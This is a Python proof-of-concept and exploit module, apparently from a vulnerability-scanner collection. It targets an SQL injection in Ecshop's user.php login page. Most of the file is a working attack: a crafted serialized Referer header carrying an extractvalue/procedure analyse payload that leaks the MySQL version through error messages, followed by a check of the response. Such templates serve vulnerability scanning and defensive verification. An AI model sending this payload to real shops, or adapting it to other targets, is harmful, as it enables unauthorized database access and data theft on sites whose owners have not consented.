import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Ecshop SQLi''',
        "description": '''A vulnerability in Ecshop allows remote unauthenticated users to inject arbitrary SQL statements into via the 'Referer' header field.''',
        "severity": "high",
        "references": [
            "https://titanwolf.org/Network/Articles/Article?AID=af15bee8-7afc-4bb2-9761-a7d61210b01a", 
            "https://phishingkittracker.blogspot.com/2019/08/userphp-ecshop-sql-injection-2017.html"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["sqli", "php", "ecshop"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/user.php?act=login"""
        method = "GET"
        data = """"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""XPATH syntax error:""" in resp0.text and """[error] =>""" in resp0.text and """[0] => Array""" in resp0.text and """MySQL server error report:Array""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url